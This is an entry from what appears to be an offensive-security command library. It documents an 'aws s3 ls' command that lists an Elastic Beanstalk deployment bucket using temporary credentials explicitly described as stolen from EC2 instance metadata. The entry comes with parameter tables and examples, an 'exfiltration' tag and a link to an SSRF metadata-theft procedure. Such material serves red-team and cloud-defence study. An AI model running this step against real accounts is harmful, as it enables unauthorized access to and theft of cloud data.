---
id: 01ab15fe-bfb6-4b82-aa82-f332037c6b86
name: aws-list-s3-bucket-contents
type: command
executor: bash
data: >-
  AWS_ACCESS_KEY_ID=[AccessKeyId] AWS_SECRET_ACCESS_KEY=[SecretAccessKey]
  AWS_SESSION_TOKEN=[Token] aws s3 ls
  s3://elasticbeanstalk-[REGION]-[ACCOUNT_ID]/ --region [REGION]
output: null
created_at: '2023-04-06T03:56:38.274742+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - aws
  - s3
  - exfiltration
verified: true
validated: true
---

# aws-list-s3-bucket-contents

## Command

```bash
AWS_ACCESS_KEY_ID=[AccessKeyId] AWS_SECRET_ACCESS_KEY=[SecretAccessKey] AWS_SESSION_TOKEN=[Token] aws s3 ls s3://elasticbeanstalk-[REGION]-[ACCOUNT_ID]/ --region [REGION]
```

## Description

This command lists the contents of an AWS S3 bucket using stolen temporary credentials from an EC2 instance role. It targets Elastic Beanstalk deployment buckets to identify sensitive files like application bundles or logs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `AWS_ACCESS_KEY_ID` | Stolen AccessKeyId from metadata | Yes |
| `AWS_SECRET_ACCESS_KEY` | Stolen SecretAccessKey | Yes |
| `AWS_SESSION_TOKEN` | Stolen session token for temporary creds | Yes |
| `s3://elasticbeanstalk-[REGION]-[ACCOUNT_ID]/` | Bucket name with placeholders for region and account | Yes |
| `--region [REGION]` | AWS region from identity document | Yes |

## Examples

### Basic Usage

```bash
AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=wJalr... AWS_SESSION_TOKEN=IQo... aws s3 ls s3://elasticbeanstalk-us-east-1-123456789012/ --region us-east-1
```

### Recursive List

```bash
... aws s3 ls s3://bucket/ --recursive
```

## Expected Output

Bucket contents listing:
```
PRE elasticbeanstalk-us-east-1-123456789012/
2023-01-01 12:00:00      1024 app.zip
```

## Related

- [[procedures/Exploit-SSRF-for-AWS-Cloud-Instance-Metadata-Access]]
- [[commands/curl-fetch-iam-security-credentials]]
